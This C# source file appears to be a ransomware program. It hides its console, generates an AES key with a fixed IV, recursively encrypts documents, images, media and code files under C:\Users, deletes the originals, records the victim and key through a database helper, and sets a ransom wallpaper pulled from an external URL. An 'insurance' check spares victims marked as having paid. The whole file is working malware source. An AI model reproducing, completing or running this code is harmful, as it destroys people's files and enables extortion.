using System;
using System.Security.Cryptography;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Dynamic;
using System.Net;
using System.Net.Sockets;
using System.Security.AccessControl;
using System.Windows.Forms;
using Decryptor;
using System.Runtime.InteropServices;
using System.Windows.Forms.VisualStyles;


namespace Encryptor
{
	internal class EncryptorClass
	{
		static List<string> targetExtensions = new List<string>(){".txt", ".jpg", ".png", ".pdf", ".mp4", ".mp3",".c",".py"};
		//String key;
		static List<string> foldersBlacklist = new List<string>() { "Windows", "Program Files", "Program Files (x86)", ".pdf", ".mp4" };
		static List<string> toDelete;
		
		//Hiding console prerequsites
		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();
		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		const int SW_HIDE = 0;
		
		public static void Main(string[] args)
		{
			hideConsole();

			checkInsurance();
			
			AesCryptoServiceProvider aes = createCipher();
			
			// Decide on base directory
			string baseDirectory = "C:\\Users";

			toDelete = new List<string>();
			// Encrypt the victims files 
			itterate(baseDirectory, aes);
			deleteUnencrypted();

			// getting paied
			//System.Console.WriteLine("Your feils have been encryptrd!");
			
			DB.addVictimToDB(aes);
			
			notifyUser();
			
			
		}



		private static void test()
		{
			string baseDirectory = "C:\\Users";
		}
		
		
		
		/// <summary>
		/// This method checks if the user has been attacked before and if he has an insurance then aborts the procecss
		/// </summary>
		private static void checkInsurance()
		{
			if (DB.getStatus() == 2)
			{
				string message = "Good news! your isnurance paied off, your computer won't be encrypted again";
				string caption = "Congradulations";
				MessageBox.Show(message, caption,MessageBoxButtons.OK,MessageBoxIcon.Exclamation);
				Environment.Exit(0);
			}
		}
		
		
		
		/// <summary>
		/// Once we are done encrypting it's time to let the user know we are here.
		/// 1. Change wallpaper
		/// 2. Make ID.text
		/// 3. Download Decryptor.exe
		/// </summary>
		private static void notifyUser()
		{
			// Change wallpaper
			Uri wallpaper = new Uri("https://image.ibb.co/cBtOmm/insane_uriel_by_urielstock_3.jpg");
			Wallpaper.Set(wallpaper,Wallpaper.Style.Fit);
			
		}
		
		
		
		/// <summary>
		/// This function recives a directpry and a aes key and encrypts
		/// recursivly all of the files in the directory
		/// </summary>
		private static void itterate(string currentDirectory, AesCryptoServiceProvider aes)
		{
			//Directory.SetAccessControl(currentDirectory,new DirectorySecurity().ModifyAccessRule(AccessControlModification.Add,new AccessRule().) );SetAttributes(currentDirectory, FileAttributes.Normal);
			
			try
			{
				var allfiles = Directory.GetFiles(currentDirectory);
				var currentFiles = allfiles.Where(fn => correctTargetExtension(Path.GetExtension(fn)));
				foreach (string filePath in currentFiles)
				{
					try
					{
						encryptFile(filePath, aes);
					}
					catch 
					{
						//System.Console.WriteLine("Couldn't Encrypt: " + currentDirectory);
					}
					
				}
				var currentDirectories = Directory.GetDirectories(currentDirectory);
				foreach (string directory in currentDirectories)
				{
					if (!directory.Contains("AppData"))
					{
						itterate(directory, aes);
					}
					
				}


			}
			catch (UnauthorizedAccessException)
			{
				//System.Console.WriteLine("didn't access: " + currentDirectory);
			}

			
		}

		
		
		/// <summary>
		/// recives a file and a key and creates another file that has the same content only encrypted and then
		/// deletes the original file
		/// </summary>
		/// <param name="filePath"></param>
		/// <param name="aes"></param>
		private static void encryptFile(string filePath, AesCryptoServiceProvider aes)
		{
			System.Threading.Thread.Sleep(15);
			var buffer = new byte[65536];
			File.SetAttributes(filePath, FileAttributes.Normal);

			using (var streamIn = new FileStream(filePath, FileMode.Open,FileAccess.Read))
			using (var streamOut = new FileStream(filePath + ".enc", FileMode.Create))
			using (var encrypt = new CryptoStream(streamOut, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				int bytesRead;
				do
				{
					bytesRead = streamIn.Read(buffer, 0, buffer.Length);
					if (bytesRead != 0)
						encrypt.Write(buffer, 0, bytesRead);
				}
				while (bytesRead != 0);
			}
			toDelete.Add(filePath);
			//File.Delete(filePath);
			//System.Console.WriteLine("Encrypted: " + filePath);

		}

		
		
		/// <summary>
		/// Itterates over all of the files that have been encrypted and deletes the original ones.
		/// </summary>
		private static void deleteUnencrypted()
		{
			foreach (var filePath in toDelete)
			{
				try
				{
					System.Threading.Thread.Sleep(6);
					//DEBUG: Console.WriteLine("Now Deleting: " + filePath);
					File.Delete(filePath);
				}
				catch
				{
				}

			}
		}

		

		private static bool correctTargetExtension(string fileExtension){
			return targetExtensions.Exists(e => e == fileExtension);
		}

		
		/// <summary>
		/// Create the Aes Key
		/// </summary>
		/// <returns>AesCryptoServiceProvider </returns>
		private static AesCryptoServiceProvider createCipher(){
			// Create the key
			var aes = new AesCryptoServiceProvider();
			aes.GenerateKey();
			aes.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };

			/*
			using (var streamOut = new FileStream("c:/test/keyFile.key", FileMode.Create)){
				BinaryWriter bin = new BinaryWriter(streamOut,new System.Text.UTF8Encoding());
				bin.Write(aes.Key, 0, 32);

				bin.Close();
			}
			*/
			return aes;
		}
		
		
		
		/// <summary>
		/// Hide the conlsoe inorder t oremain discreate
		/// </summary>
		private static void hideConsole()
		{
			var handle = GetConsoleWindow();
			ShowWindow(handle, SW_HIDE);
		} 
		
		
		
		
		
		
		
		public static void changeDirectoryPermissions(string path){
			System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(path);
			FileSystemAccessRule fsar = new FileSystemAccessRule(path, FileSystemRights.FullControl, AccessControlType.Allow);
			DirectorySecurity ds = null;
			ds = di.GetAccessControl();
			ds.AddAccessRule(fsar);
			di.SetAccessControl(ds); // nothing happens until you do this
		}

	}
	
}